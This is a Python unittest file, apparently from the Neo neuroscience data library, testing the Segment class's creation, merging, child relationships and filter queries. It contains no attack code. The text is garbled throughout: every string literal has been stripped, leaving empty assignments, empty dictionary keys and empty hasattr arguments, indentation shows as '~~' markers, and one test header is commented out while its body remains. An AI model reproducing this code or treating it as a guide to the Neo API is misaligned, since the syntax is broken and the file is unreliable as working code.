self . assertEqual ( res . spiketrains [ 0 ] . annotations , \n 
self . annotations ) \n 
self . assertEqual ( res . spikes [ 0 ] . annotations , \n 
self . annotations ) \n 
self . assertEqual ( res . events [ 0 ] . annotations , \n 
self . annotations ) \n 
self . assertEqual ( res . epochs [ 0 ] . annotations , \n 
self . annotations ) \n 
self . assertEqual ( res . eventarrays [ 0 ] . annotations , \n 
self . annotations ) \n 
self . assertEqual ( res . epocharrays [ 0 ] . annotations , \n 
self . annotations ) \n 
\n 
~~ def test__fake_neo__nocascade ( self ) : \n 
~~~ self . annotations [ ] = None \n 
obj_type = \n 
cascade = False \n 
res = fake_neo ( obj_type = obj_type , cascade = cascade ) \n 
\n 
self . assertTrue ( isinstance ( res , Segment ) ) \n 
assert_neo_object_is_compliant ( res ) \n 
self . assertEqual ( res . annotations , self . annotations ) \n 
\n 
self . assertEqual ( len ( res . analogsignalarrays ) , 0 ) \n 
self . assertEqual ( len ( res . analogsignals ) , 0 ) \n 
self . assertEqual ( len ( res . irregularlysampledsignals ) , 0 ) \n 
self . assertEqual ( len ( res . spiketrains ) , 0 ) \n 
self . assertEqual ( len ( res . spikes ) , 0 ) \n 
self . assertEqual ( len ( res . events ) , 0 ) \n 
self . assertEqual ( len ( res . epochs ) , 0 ) \n 
self . assertEqual ( len ( res . eventarrays ) , 0 ) \n 
self . assertEqual ( len ( res . epocharrays ) , 0 ) \n 
\n 
\n 
~~ ~~ class TestSegment ( unittest . TestCase ) : \n 
~~~ def setUp ( self ) : \n 
~~~ self . nchildren = 2 \n 
blk = fake_neo ( Block , seed = 0 , n = self . nchildren ) \n 
self . unit1 , self . unit2 , self . unit3 , self . unit4 = blk . list_units \n 
self . seg1 , self . seg2 = blk . segments \n 
self . targobj = self . seg1 \n 
self . seed1 = self . seg1 . annotations [ ] \n 
self . seed2 = self . seg2 . annotations [ ] \n 
\n 
del self . seg1 . annotations [ ] \n 
del self . seg2 . annotations [ ] \n 
del self . seg1 . annotations [ ] \n 
del self . seg2 . annotations [ ] \n 
\n 
self . sigs1 = self . seg1 . analogsignals \n 
self . sigs2 = self . seg2 . analogsignals \n 
self . sigarrs1 = self . seg1 . analogsignalarrays \n 
self . sigarrs2 = self . seg2 . analogsignalarrays \n 
self . irsigs1 = self . seg1 . irregularlysampledsignals \n 
self . irsigs2 = self . seg2 . irregularlysampledsignals \n 
\n 
self . spikes1 = self . seg1 . spikes \n 
self . spikes2 = self . seg2 . spikes \n 
self . trains1 = self . seg1 . spiketrains \n 
self . trains2 = self . seg2 . spiketrains \n 
\n 
self . epcs1 = self . seg1 . epochs \n 
self . epcs2 = self . seg2 . epochs \n 
self . epcas1 = self . seg1 . epocharrays \n 
self . epcas2 = self . seg2 . epocharrays \n 
self . evts1 = self . seg1 . events \n 
self . evts2 = self . seg2 . events \n 
self . evtas1 = self . seg1 . eventarrays \n 
self . evtas2 = self . seg2 . eventarrays \n 
\n 
self . sigs1a = clone_object ( self . sigs1 ) \n 
self . sigarrs1a = clone_object ( self . sigarrs1 , n = 2 ) \n 
self . irsigs1a = clone_object ( self . irsigs1 ) \n 
\n 
self . spikes1a = clone_object ( self . spikes1 ) \n 
self . trains1a = clone_object ( self . trains1 ) \n 
\n 
self . epcs1a = clone_object ( self . epcs1 ) \n 
self . epcas1a = clone_object ( self . epcas1 ) \n 
self . evts1a = clone_object ( self . evts1 ) \n 
self . evtas1a = clone_object ( self . evtas1 ) \n 
\n 
for obj , obja in zip ( self . sigs1 + self . sigarrs1 , \n 
self . sigs1a + self . sigarrs1a ) : \n 
~~~ obja . channel_index = obj . channel_index \n 
\n 
~~ ~~ def test_init ( self ) : \n 
~~~ seg = Segment ( name = , index = 3 ) \n 
assert_neo_object_is_compliant ( seg ) \n 
self . assertEqual ( seg . name , ) \n 
self . assertEqual ( seg . file_origin , None ) \n 
self . assertEqual ( seg . index , 3 ) \n 
\n 
~~ def check_creation ( self , seg ) : \n 
~~~ assert_neo_object_is_compliant ( seg ) \n 
\n 
seed = seg . annotations [ ] \n 
\n 
targ0 = get_fake_value ( , datetime , seed = seed + 0 ) \n 
self . assertEqual ( seg . file_datetime , targ0 ) \n 
\n 
targ1 = get_fake_value ( , datetime , seed = seed + 1 ) \n 
self . assertEqual ( seg . rec_datetime , targ1 ) \n 
\n 
targ2 = get_fake_value ( , int , seed = seed + 2 ) \n 
self . assertEqual ( seg . index , targ2 ) \n 
\n 
targ3 = get_fake_value ( , str , seed = seed + 3 , obj = Segment ) \n 
self . assertEqual ( seg . name , targ3 ) \n 
\n 
targ4 = get_fake_value ( , str , \n 
seed = seed + 4 , obj = Segment ) \n 
self . assertEqual ( seg . description , targ4 ) \n 
\n 
targ5 = get_fake_value ( , str ) \n 
self . assertEqual ( seg . file_origin , targ5 ) \n 
\n 
targ6 = get_annotations ( ) \n 
targ6 [ ] = seed \n 
self . assertEqual ( seg . annotations , targ6 ) \n 
\n 
self . assertTrue ( hasattr ( seg , ) ) \n 
self . assertTrue ( hasattr ( seg , ) ) \n 
self . assertTrue ( hasattr ( seg , ) ) \n 
\n 
self . assertTrue ( hasattr ( seg , ) ) \n 
self . assertTrue ( hasattr ( seg , ) ) \n 
self . assertTrue ( hasattr ( seg , ) ) \n 
self . assertTrue ( hasattr ( seg , ) ) \n 
\n 
self . assertTrue ( hasattr ( seg , ) ) \n 
self . assertTrue ( hasattr ( seg , ) ) \n 
\n 
self . assertEqual ( len ( seg . analogsignals ) , self . nchildren ** 2 ) \n 
self . assertEqual ( len ( seg . analogsignalarrays ) , self . nchildren ) \n 
self . assertEqual ( len ( seg . irregularlysampledsignals ) , self . nchildren ** 2 ) \n 
\n 
self . assertEqual ( len ( seg . epochs ) , self . nchildren ) \n 
self . assertEqual ( len ( seg . epocharrays ) , self . nchildren ) \n 
self . assertEqual ( len ( seg . events ) , self . nchildren ) \n 
self . assertEqual ( len ( seg . eventarrays ) , self . nchildren ) \n 
\n 
self . assertEqual ( len ( seg . spikes ) , self . nchildren ** 2 ) \n 
self . assertEqual ( len ( seg . spiketrains ) , self . nchildren ** 2 ) \n 
\n 
~~ def test__creation ( self ) : \n 
~~~ self . check_creation ( self . seg1 ) \n 
self . check_creation ( self . seg2 ) \n 
\n 
~~ def test__merge ( self ) : \n 
~~~ seg1a = fake_neo ( Block , seed = self . seed1 , n = self . nchildren ) . segments [ 0 ] \n 
assert_same_sub_schema ( self . seg1 , seg1a ) \n 
seg1a . spikes . append ( self . spikes2 [ 0 ] ) \n 
seg1a . epocharrays . append ( self . epcas2 [ 0 ] ) \n 
seg1a . annotate ( seed = self . seed2 ) \n 
seg1a . merge ( self . seg2 ) \n 
self . check_creation ( self . seg2 ) \n 
\n 
assert_same_sub_schema ( self . sigs1a + self . sigs2 , seg1a . analogsignals ) \n 
assert_same_sub_schema ( self . sigarrs1a + self . sigarrs2 , \n 
seg1a . analogsignalarrays ) \n 
assert_same_sub_schema ( self . irsigs1a + self . irsigs2 , \n 
seg1a . irregularlysampledsignals ) \n 
\n 
assert_same_sub_schema ( self . epcs1 + self . epcs2 , seg1a . epochs ) \n 
assert_same_sub_schema ( self . epcas1 + self . epcas2 , seg1a . epocharrays ) \n 
assert_same_sub_schema ( self . evts1 + self . evts2 , seg1a . events ) \n 
assert_same_sub_schema ( self . evtas1 + self . evtas2 , seg1a . eventarrays ) \n 
\n 
assert_same_sub_schema ( self . spikes1 + self . spikes2 , seg1a . spikes ) \n 
assert_same_sub_schema ( self . trains1 + self . trains2 , seg1a . spiketrains ) \n 
\n 
~~ def test__children ( self ) : \n 
~~~ blk = Block ( name = ) \n 
blk . segments = [ self . seg1 ] \n 
blk . create_many_to_one_relationship ( force = True ) \n 
assert_neo_object_is_compliant ( self . seg1 ) \n 
assert_neo_object_is_compliant ( blk ) \n 
\n 
childobjs = ( , , \n 
, , \n 
, , \n 
, \n 
, ) \n 
childconts = ( , , \n 
, , \n 
, , \n 
, \n 
, ) \n 
self . assertEqual ( self . seg1 . _container_child_objects , ( ) ) \n 
self . assertEqual ( self . seg1 . _data_child_objects , childobjs ) \n 
self . assertEqual ( self . seg1 . _single_parent_objects , ( , ) ) \n 
self . assertEqual ( self . seg1 . _multi_child_objects , ( ) ) \n 
self . assertEqual ( self . seg1 . _multi_parent_objects , ( ) ) \n 
self . assertEqual ( self . seg1 . _child_properties , ( ) ) \n 
\n 
self . assertEqual ( self . seg1 . _single_child_objects , childobjs ) \n 
self . assertEqual ( self . seg1 . _container_child_containers , ( ) ) \n 
self . assertEqual ( self . seg1 . _data_child_containers , childconts ) \n 
self . assertEqual ( self . seg1 . _single_child_containers , childconts ) \n 
self . assertEqual ( self . seg1 . _single_parent_containers , ( , ) ) \n 
self . assertEqual ( self . seg1 . _multi_child_containers , ( ) ) \n 
self . assertEqual ( self . seg1 . _multi_parent_containers , ( ) ) \n 
\n 
self . assertEqual ( self . seg1 . _child_objects , childobjs ) \n 
self . assertEqual ( self . seg1 . _child_containers , childconts ) \n 
self . assertEqual ( self . seg1 . _parent_objects , ( , ) ) \n 
self . assertEqual ( self . seg1 . _parent_containers , ( , ) ) \n 
\n 
totchildren = ( self . nchildren * 2 * 2 + # epoch/event(array) \n 
self . nchildren + # analogsignalarray \n 
2 * ( self . nchildren ** 2 ) + # spike(train) \n 
2 * ( self . nchildren ** 2 ) ) # analog/irregsignal \n 
self . assertEqual ( len ( self . seg1 . _single_children ) , totchildren ) \n 
self . assertEqual ( len ( self . seg1 . data_children ) , totchildren ) \n 
self . assertEqual ( len ( self . seg1 . children ) , totchildren ) \n 
self . assertEqual ( len ( self . seg1 . data_children_recur ) , totchildren ) \n 
self . assertEqual ( len ( self . seg1 . children_recur ) , totchildren ) \n 
\n 
self . assertEqual ( len ( self . seg1 . _multi_children ) , 0 ) \n 
self . assertEqual ( len ( self . seg1 . container_children ) , 0 ) \n 
self . assertEqual ( len ( self . seg1 . container_children_recur ) , 0 ) \n 
\n 
children = ( self . sigs1a + self . sigarrs1a + \n 
self . epcs1a + self . epcas1a + \n 
self . evts1a + self . evtas1a + \n 
self . irsigs1a + \n 
self . spikes1a + self . trains1a ) \n 
assert_same_sub_schema ( list ( self . seg1 . _single_children ) , children ) \n 
assert_same_sub_schema ( list ( self . seg1 . data_children ) , children ) \n 
assert_same_sub_schema ( list ( self . seg1 . data_children_recur ) , children ) \n 
assert_same_sub_schema ( list ( self . seg1 . children ) , children ) \n 
assert_same_sub_schema ( list ( self . seg1 . children_recur ) , children ) \n 
\n 
self . assertEqual ( len ( self . seg1 . parents ) , 1 ) \n 
self . assertEqual ( self . seg1 . parents [ 0 ] . name , ) \n 
\n 
~~ def test__size ( self ) : \n 
~~~ targ1 = { "epochs" : self . nchildren , "events" : self . nchildren , \n 
"analogsignals" : self . nchildren ** 2 , \n 
"irregularlysampledsignals" : self . nchildren ** 2 , \n 
"spikes" : self . nchildren ** 2 , \n 
"spiketrains" : self . nchildren ** 2 , \n 
"epocharrays" : self . nchildren , "eventarrays" : self . nchildren , \n 
"analogsignalarrays" : self . nchildren } \n 
self . assertEqual ( self . targobj . size , targ1 ) \n 
\n 
~~ def test__filter_none ( self ) : \n 
~~~ targ = [ ] \n 
\n 
res0 = self . targobj . filter ( ) \n 
res1 = self . targobj . filter ( { } ) \n 
res2 = self . targobj . filter ( [ ] ) \n 
res3 = self . targobj . filter ( [ { } ] ) \n 
res4 = self . targobj . filter ( [ { } , { } ] ) \n 
res5 = self . targobj . filter ( [ { } , { } ] ) \n 
res6 = self . targobj . filter ( targdict = { } ) \n 
res7 = self . targobj . filter ( targdict = [ ] ) \n 
res8 = self . targobj . filter ( targdict = [ { } ] ) \n 
res9 = self . targobj . filter ( targdict = [ { } , { } ] ) \n 
\n 
assert_same_sub_schema ( res0 , targ ) \n 
assert_same_sub_schema ( res1 , targ ) \n 
assert_same_sub_schema ( res2 , targ ) \n 
assert_same_sub_schema ( res3 , targ ) \n 
assert_same_sub_schema ( res4 , targ ) \n 
assert_same_sub_schema ( res5 , targ ) \n 
assert_same_sub_schema ( res6 , targ ) \n 
assert_same_sub_schema ( res7 , targ ) \n 
assert_same_sub_schema ( res8 , targ ) \n 
assert_same_sub_schema ( res9 , targ ) \n 
\n 
~~ def test__filter_annotation_single ( self ) : \n 
~~~ targ = ( self . sigs1a + self . sigarrs1a + \n 
[ self . epcs1a [ 0 ] , self . epcas1a [ 0 ] ] + \n 
[ self . evts1a [ 0 ] , self . evtas1a [ 0 ] ] + \n 
self . irsigs1a + \n 
self . spikes1a + self . trains1a ) \n 
\n 
res0 = self . targobj . filter ( j = 0 ) \n 
res1 = self . targobj . filter ( { : 0 } ) \n 
res2 = self . targobj . filter ( targdict = { : 0 } ) \n 
res3 = self . targobj . filter ( [ { : 0 } ] ) \n 
res4 = self . targobj . filter ( targdict = [ { : 0 } ] ) \n 
\n 
assert_same_sub_schema ( res0 , targ ) \n 
assert_same_sub_schema ( res1 , targ ) \n 
assert_same_sub_schema ( res2 , targ ) \n 
assert_same_sub_schema ( res3 , targ ) \n 
assert_same_sub_schema ( res4 , targ ) \n 
\n 
~~ def test__filter_single_annotation_nores ( self ) : \n 
~~~ targ = [ ] \n 
\n 
res0 = self . targobj . filter ( j = 5 ) \n 
res1 = self . targobj . filter ( { : 5 } ) \n 
res2 = self . targobj . filter ( targdict = { : 5 } ) \n 
res3 = self . targobj . filter ( [ { : 5 } ] ) \n 
res4 = self . targobj . filter ( targdict = [ { : 5 } ] ) \n 
\n 
assert_same_sub_schema ( res0 , targ ) \n 
assert_same_sub_schema ( res1 , targ ) \n 
assert_same_sub_schema ( res2 , targ ) \n 
assert_same_sub_schema ( res3 , targ ) \n 
assert_same_sub_schema ( res4 , targ ) \n 
\n 
~~ def test__filter_attribute_single ( self ) : \n 
~~~ targ = [ self . epcs1a [ 1 ] ] \n 
\n 
res0 = self . targobj . filter ( name = self . epcs1a [ 1 ] . name ) \n 
res1 = self . targobj . filter ( { : self . epcs1a [ 1 ] . name } ) \n 
res2 = self . targobj . filter ( targdict = { : self . epcs1a [ 1 ] . name } ) \n 
\n 
assert_same_sub_schema ( res0 , targ ) \n 
assert_same_sub_schema ( res1 , targ ) \n 
assert_same_sub_schema ( res2 , targ ) \n 
\n 
~~ def test__filter_attribute_single_nores ( self ) : \n 
~~~ targ = [ ] \n 
\n 
res0 = self . targobj . filter ( name = self . epcs2 [ 0 ] . name ) \n 
res1 = self . targobj . filter ( { : self . epcs2 [ 0 ] . name } ) \n 
res2 = self . targobj . filter ( targdict = { : self . epcs2 [ 0 ] . name } ) \n 
\n 
assert_same_sub_schema ( res0 , targ ) \n 
assert_same_sub_schema ( res1 , targ ) \n 
assert_same_sub_schema ( res2 , targ ) \n 
\n 
~~ def test__filter_multi ( self ) : \n 
~~~ targ = ( self . sigs1a + self . sigarrs1a + \n 
[ self . epcs1a [ 0 ] , self . epcas1a [ 0 ] ] + \n 
[ self . evts1a [ 0 ] , self . evtas1a [ 0 ] ] + \n 
self . irsigs1a + \n 
self . spikes1a + self . trains1a + \n 
[ self . epcs1a [ 1 ] ] ) \n 
\n 
res0 = self . targobj . filter ( name = self . epcs1a [ 1 ] . name , j = 0 ) \n 
res1 = self . targobj . filter ( { : self . epcs1a [ 1 ] . name , : 0 } ) \n 
res2 = self . targobj . filter ( targdict = { : self . epcs1a [ 1 ] . name , \n 
: 0 } ) \n 
\n 
assert_same_sub_schema ( res0 , targ ) \n 
assert_same_sub_schema ( res1 , targ ) \n 
assert_same_sub_schema ( res2 , targ ) \n 
\n 
~~ def test__filter_multi_nores ( self ) : \n 
~~~ targ = [ ] \n 
\n 
res0 = self . targobj . filter ( [ { : 0 } , { } ] ) \n 
res1 = self . targobj . filter ( { } , ttype = 0 ) \n 
res2 = self . targobj . filter ( [ { } ] , ttype = 0 ) \n 
res3 = self . targobj . filter ( { : self . epcs1a [ 1 ] . name } , j = 0 ) \n 
res4 = self . targobj . filter ( targdict = { : self . epcs1a [ 1 ] . name } , \n 
j = 0 ) \n 
res5 = self . targobj . filter ( name = self . epcs1a [ 1 ] . name , \n 
targdict = { : 0 } ) \n 
res6 = self . targobj . filter ( name = self . epcs2 [ 0 ] . name , j = 5 ) \n 
res7 = self . targobj . filter ( { : self . epcs2 [ 1 ] . name , : 5 } ) \n 
res8 = self . targobj . filter ( targdict = { : self . epcs2 [ 1 ] . name , \n 
: 5 } ) \n 
res9 = self . targobj . filter ( { : self . epcs2 [ 1 ] . name } , j = 5 ) \n 
res10 = self . targobj . filter ( targdict = { : self . epcs2 [ 1 ] . name } , \n 
j = 5 ) \n 
res11 = self . targobj . filter ( name = self . epcs2 [ 1 ] . name , \n 
targdict = { : 5 } ) \n 
res12 = self . targobj . filter ( { : self . epcs1a [ 1 ] . name } , j = 5 ) \n 
res13 = self . targobj . filter ( targdict = { : self . epcs1a [ 1 ] . name } , \n 
j = 5 ) \n 
res14 = self . targobj . filter ( name = self . epcs1a [ 1 ] . name , \n 
targdict = { : 5 } ) \n 
\n 
assert_same_sub_schema ( res0 , targ ) \n 
assert_same_sub_schema ( res1 , targ ) \n 
assert_same_sub_schema ( res2 , targ ) \n 
assert_same_sub_schema ( res3 , targ ) \n 
assert_same_sub_schema ( res4 , targ ) \n 
assert_same_sub_schema ( res5 , targ ) \n 
assert_same_sub_schema ( res6 , targ ) \n 
assert_same_sub_schema ( res7 , targ ) \n 
assert_same_sub_schema ( res8 , targ ) \n 
assert_same_sub_schema ( res9 , targ ) \n 
assert_same_sub_schema ( res10 , targ ) \n 
assert_same_sub_schema ( res11 , targ ) \n 
assert_same_sub_schema ( res12 , targ ) \n 
assert_same_sub_schema ( res13 , targ ) \n 
assert_same_sub_schema ( res14 , targ ) \n 
\n 
~~ def test__filter_multi_partres ( self ) : \n 
~~~ targ = [ self . epcs1a [ 1 ] ] \n 
\n 
res0 = self . targobj . filter ( name = self . epcs1a [ 1 ] . name , j = 5 ) \n 
res1 = self . targobj . filter ( { : self . epcs1a [ 1 ] . name , : 5 } ) \n 
res2 = self . targobj . filter ( targdict = { : self . epcs1a [ 1 ] . name , \n 
: 5 } ) \n 
res3 = self . targobj . filter ( [ { : 1 } , { : 2 } ] ) \n 
res4 = self . targobj . filter ( { : 1 } , i = 2 ) \n 
res5 = self . targobj . filter ( [ { : 1 } ] , i = 2 ) \n 
\n 
assert_same_sub_schema ( res0 , targ ) \n 
assert_same_sub_schema ( res1 , targ ) \n 
assert_same_sub_schema ( res2 , targ ) \n 
assert_same_sub_schema ( res3 , targ ) \n 
assert_same_sub_schema ( res4 , targ ) \n 
assert_same_sub_schema ( res5 , targ ) \n 
\n 
~~ def test__filter_single_annotation_obj_single ( self ) : \n 
~~~ targ = [ self . epcs1a [ 1 ] ] \n 
\n 
res0 = self . targobj . filter ( j = 1 , objects = ) \n 
res1 = self . targobj . filter ( j = 1 , objects = Epoch ) \n 
res2 = self . targobj . filter ( j = 1 , objects = [ ] ) \n 
res3 = self . targobj . filter ( j = 1 , objects = [ Epoch ] ) \n 
res4 = self . targobj . filter ( j = 1 , objects = [ Epoch , \n 
RecordingChannelGroup ] ) \n 
\n 
assert_same_sub_schema ( res0 , targ ) \n 
assert_same_sub_schema ( res1 , targ ) \n 
assert_same_sub_schema ( res2 , targ ) \n 
assert_same_sub_schema ( res3 , targ ) \n 
assert_same_sub_schema ( res4 , targ ) \n 
\n 
~~ def test__filter_single_annotation_obj_multi ( self ) : \n 
~~~ targ = [ self . epcs1a [ 1 ] , self . epcas1a [ 1 ] ] \n 
\n 
res0 = self . targobj . filter ( j = 1 , objects = [ , EpochArray ] ) \n 
\n 
assert_same_sub_schema ( res0 , targ ) \n 
\n 
~~ def test__filter_single_annotation_obj_none ( self ) : \n 
~~~ targ = [ ] \n 
\n 
res0 = self . targobj . filter ( j = 1 , objects = RecordingChannelGroup ) \n 
res1 = self . targobj . filter ( j = 1 , objects = ) \n 
res2 = self . targobj . filter ( j = 1 , objects = [ ] ) \n 
\n 
assert_same_sub_schema ( res0 , targ ) \n 
assert_same_sub_schema ( res1 , targ ) \n 
assert_same_sub_schema ( res2 , targ ) \n 
\n 
~~ def test__filter_single_annotation_norecur ( self ) : \n 
~~~ targ = [ self . epcs1a [ 1 ] , self . epcas1a [ 1 ] , \n 
self . evts1a [ 1 ] , self . evtas1a [ 1 ] ] \n 
res0 = self . targobj . filter ( j = 1 , \n 
recursive = False ) \n 
assert_same_sub_schema ( res0 , targ ) \n 
\n 
~~ def test__filter_single_attribute_norecur ( self ) : \n 
~~~ targ = [ self . epcs1a [ 1 ] ] \n 
res0 = self . targobj . filter ( name = self . epcs1a [ 1 ] . name , \n 
recursive = False ) \n 
assert_same_sub_schema ( res0 , targ ) \n 
\n 
~~ def test__filter_single_annotation_nodata ( self ) : \n 
~~~ targ = [ ] \n 
res0 = self . targobj . filter ( j = 0 , \n 
data = False ) \n 
assert_same_sub_schema ( res0 , targ ) \n 
\n 
~~ def test__filter_single_attribute_nodata ( self ) : \n 
~~~ targ = [ ] \n 
res0 = self . targobj . filter ( name = self . epcs1a [ 1 ] . name , \n 
data = False ) \n 
assert_same_sub_schema ( res0 , targ ) \n 
\n 
~~ def test__filter_single_annotation_nodata_norecur ( self ) : \n 
~~~ targ = [ ] \n 
res0 = self . targobj . filter ( j = 0 , \n 
data = False , recursive = False ) \n 
assert_same_sub_schema ( res0 , targ ) \n 
\n 
~~ def test__filter_single_attribute_nodata_norecur ( self ) : \n 
~~~ targ = [ ] \n 
res0 = self . targobj . filter ( name = self . epcs1a [ 1 ] . name , \n 
data = False , recursive = False ) \n 
assert_same_sub_schema ( res0 , targ ) \n 
\n 
~~ def test__filter_single_annotation_container ( self ) : \n 
~~~ targ = [ self . epcs1a [ 1 ] , self . epcas1a [ 1 ] , \n 
self . evts1a [ 1 ] , self . evtas1a [ 1 ] ] \n 
res0 = self . targobj . filter ( j = 1 , \n 
container = True ) \n 
assert_same_sub_schema ( res0 , targ ) \n 
\n 
~~ def test__filter_single_attribute_container ( self ) : \n 
~~~ targ = [ self . epcs1a [ 1 ] ] \n 
res0 = self . targobj . filter ( name = self . epcs1a [ 1 ] . name , \n 
container = True ) \n 
assert_same_sub_schema ( res0 , targ ) \n 
\n 
~~ def test__filter_single_annotation_container_norecur ( self ) : \n 
~~~ targ = [ self . epcs1a [ 1 ] , self . epcas1a [ 1 ] , \n 
self . evts1a [ 1 ] , self . evtas1a [ 1 ] ] \n 
res0 = self . targobj . filter ( j = 1 , \n 
container = True , recursive = False ) \n 
assert_same_sub_schema ( res0 , targ ) \n 
\n 
~~ def test__filter_single_attribute_container_norecur ( self ) : \n 
~~~ targ = [ self . epcs1a [ 1 ] ] \n 
res0 = self . targobj . filter ( name = self . epcs1a [ 1 ] . name , \n 
container = True , recursive = False ) \n 
assert_same_sub_schema ( res0 , targ ) \n 
\n 
~~ def test__filter_single_annotation_nodata_container ( self ) : \n 
~~~ targ = [ ] \n 
res0 = self . targobj . filter ( j = 0 , \n 
data = False , container = True ) \n 
assert_same_sub_schema ( res0 , targ ) \n 
\n 
~~ def test__filter_single_attribute_nodata_container ( self ) : \n 
~~~ targ = [ ] \n 
res0 = self . targobj . filter ( name = self . epcs1a [ 1 ] . name , \n 
data = False , container = True ) \n 
assert_same_sub_schema ( res0 , targ ) \n 
\n 
~~ def test__filter_single_annotation_nodata_container_norecur ( self ) : \n 
~~~ targ = [ ] \n 
res0 = self . targobj . filter ( j = 0 , \n 
data = False , container = True , \n 
recursive = False ) \n 
assert_same_sub_schema ( res0 , targ ) \n 
\n 
~~ def test__filter_single_attribute_nodata_container_norecur ( self ) : \n 
~~~ targ = [ ] \n 
res0 = self . targobj . filter ( name = self . epcs1a [ 1 ] . name , \n 
data = False , container = True , \n 
recursive = False ) \n 
assert_same_sub_schema ( res0 , targ ) \n 
\n 
#def test__filterdata_multi(self): \n 
data = self . targobj . children_recur \n 
\n 
targ = ( self . sigs1a + self . sigarrs1a + \n 
[ self . epcs1a [ 0 ] , self . epcas1a [ 0 ] ] + \n 
[ self . evts1a [ 0 ] , self . evtas1a [ 0 ] ] + \n 
self . irsigs1a + \n 
self . spikes1a + self . trains1a + \n 
[ self . epcs1a [ 1 ] ] ) \n 
\n 
res0 = filterdata ( data , name = self . epcs1a [ 1 ] . name , j = 0 ) \n 
res1 = filterdata ( data , { : self . epcs1a [ 1 ] . name , : 0 } ) \n 
res2 = filterdata ( data , targdict = { : self . epcs1a [ 1 ] . name , : 0 } ) \n 
\n 
assert_same_sub_schema ( res0 , targ ) \n 
assert_same_sub_schema ( res1 , targ ) \n 
assert_same_sub_schema ( res2 , targ ) \n 
\n 
~~ def test__filterdata_multi_nores ( self ) : \n 
~~~ data = self . targobj . children_recur \n 
\n 
targ = [ ] \n 
\n 
res0 = filterdata ( data , [ { : 0 } , { } ] ) \n 
res1 = filterdata ( data , { } , ttype = 0 ) \n 
res2 = filterdata ( data , [ { } ] , ttype = 0 ) \n 
res3 = filterdata ( data , { : self . epcs1a [ 1 ] . name } , j = 0 ) \n 
res4 = filterdata ( data , targdict = { : self . epcs1a [ 1 ] . name } , j = 0 ) \n 
res5 = filterdata ( data , name = self . epcs1a [ 1 ] . name , targdict = { : 0 } ) \n 
res6 = filterdata ( data , name = self . epcs2 [ 0 ] . name , j = 5 ) \n 
res7 = filterdata ( data , { : self . epcs2 [ 1 ] . name , : 5 } ) \n 
res8 = filterdata ( data , targdict = { : self . epcs2 [ 1 ] . name , : 5 } ) \n 
res9 = filterdata ( data , { : self . epcs2 [ 1 ] . name } , j = 5 ) \n 
res10 = filterdata ( data , targdict = { : self . epcs2 [ 1 ] . name } , j = 5 ) \n 
res11 = filterdata ( data , name = self . epcs2 [ 1 ] . name , targdict = { : 5 } ) \n 
res12 = filterdata ( data , { : self . epcs1a [ 1 ] . name } , j = 5 ) \n 
res13 = filterdata ( data , targdict = { : self . epcs1a [ 1 ] . name } , j = 5 ) \n 
res14 = filterdata ( data , name = self . epcs1a [ 1 ] . name , targdict = { : 5 } ) \n 
\n 
assert_same_sub_schema ( res0 , targ ) \n 
assert_same_sub_schema ( res1 , targ ) \n 
assert_same_sub_schema ( res2 , targ ) \n 
assert_same_sub_schema ( res3 , targ ) \n 
assert_same_sub_schema ( res4 , targ ) \n 
assert_same_sub_schema ( res5 , targ ) \n 
assert_same_sub_schema ( res6 , targ ) \n 
assert_same_sub_schema ( res7 , targ ) \n 
assert_same_sub_schema ( res8 , targ ) \n 
assert_same_sub_schema ( res9 , targ ) \n 
assert_same_sub_schema ( res10 , targ ) \n 
assert_same_sub_schema ( res11 , targ ) \n 
assert_same_sub_schema ( res12 , targ ) \n 
assert_same_sub_schema ( res13 , targ ) \n 
assert_same_sub_schema ( res14 , targ ) \n 
\n 
~~ def test__filterdata_multi_partres ( self ) : \n 
~~~ data = self . targobj . children_recur \n 
\n 
targ = [ self . epcs1a [ 1 ] ] \n 
\n 
res0 = filterdata ( data , name = self . epcs1a [ 1 ] . name , j = 5 ) \n 
res1 = filterdata ( data , { : self . epcs1a [ 1 ] . name , : 5 } ) \n 
res2 = filterdata ( data , targdict = { : self . epcs1a [ 1 ] . name , : 5 } ) \n 
res3 = filterdata ( data , [ { : 1 } , { : 2 } ] ) \n 
res4 = filterdata ( data , { : 1 } , i = 2 ) \n 
res5 = filterdata ( data , [ { : 1 } ] , i = 2 ) \n 
\n 
assert_same_sub_schema ( res0 , targ ) \n 
assert_same_sub_schema ( res1 , targ ) \n 
assert_same_sub_schema ( res2 , targ ) \n 
assert_same_sub_schema ( res3 , targ ) \n 
assert_same_sub_schema ( res4 , targ ) \n 
assert_same_sub_schema ( res5 , targ ) \n 
\n 
~~ @ unittest . skipUnless ( HAVE_IPYTHON , "requires IPython" ) \n 
def test__pretty ( self ) : \n 
~~~ ann = get_annotations ( ) \n 
ann [ ] = self . seed1 \n 
ann = pretty ( ann ) . replace ( , ) \n 
res = pretty ( self . seg1 ) \n 
\n 
sig0 = pretty ( self . sigs1 [ 0 ] ) \n 
sig1 = pretty ( self . sigs1 [ 1 ] ) \n 
sig2 = pretty ( self . sigs1 [ 2 ] ) \n 
sig3 = pretty ( self . sigs1 [ 3 ] ) \n 
sig0 = sig0 . replace ( , ) \n 
sig1 = sig1 . replace ( , ) \n 
sig2 = sig2 . replace ( , ) \n 
sig3 = sig3 . replace ( , ) \n 
\n 
sigarr0 = pretty ( self . sigarrs1 [ 0 ] ) \n 
sigarr1 = pretty ( self . sigarrs1 [ 1 ] ) \n 
sigarr0 = sigarr0 . replace ( , ) \n 
sigarr1 = sigarr1 . replace ( , ) \n 
\n 
targ = ( "Segment with " + \n 
( "%s analogsignals, %s analogsignalarrays, " % \n 
( len ( self . sigs1a ) , len ( self . sigarrs1a ) ) ) + \n 
( "%s epochs, %s epocharrays, " % \n 
( len ( self . epcs1a ) , len ( self . epcas1a ) ) ) + \n 
( "%s events, %s eventarrays, " % \n 
( len ( self . evts1a ) , len ( self . evtas1a ) ) ) + \n 
( "%s irregularlysampledsignals, " % \n 
len ( self . irsigs1a ) ) + \n 
( "%s spikes, %s spiketrains\\n" % \n 
( len ( self . spikes1a ) , len ( self . trains1a ) ) ) + \n 
( "name: \'%s\'\\ndescription: \'%s\'\\n" % \n 
( self . seg1 . name , self . seg1 . description ) \n 
) + \n 
\n 
( "annotations: %s\\n" % ann ) + \n 
\n 
( "# analogsignals (N=%s)\\n" % len ( self . sigs1a ) ) + \n 
\n 
( % ( 0 , sig0 ) ) + \n 
( % ( 1 , sig1 ) ) + \n 
( % ( 2 , sig2 ) ) + \n 
( % ( 3 , sig3 ) ) + \n 
\n 
( "# analogsignalarrays (N=%s)\\n" % len ( self . sigarrs1a ) ) + \n 
\n 
( % ( 0 , sigarr0 ) ) + \n 
( % ( 1 , sigarr1 ) ) ) \n 
